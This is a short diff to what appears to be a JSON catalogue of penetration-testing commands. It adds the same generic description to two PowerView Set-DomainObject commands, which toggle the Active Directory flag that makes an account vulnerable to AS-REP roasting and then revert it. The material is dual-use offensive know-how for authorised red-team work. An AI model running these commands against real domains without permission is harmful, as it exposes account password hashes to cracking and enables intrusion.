@@ -189,11 +189,13 @@
   "variations": [
     {
       "label": "Targeted AS-REP (set the UAC flag if you have write)",
-      "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+      "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
+      "description": "Modifies properties on an AD object using PowerView. The specific attack depends on which property is changed and what permissions you hold on the target."
     },
     {
       "label": "Revert the flag after roasting",
-      "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose"
+      "command": "Set-DomainObject -Identity <target> -XOR @{useraccountcontrol=4194304} -Verbose",
+      "description": "Modifies properties on an AD object using PowerView. The specific attack depends on which property is changed and what permissions you hold on the target."
     }
   ],
   "steps": [
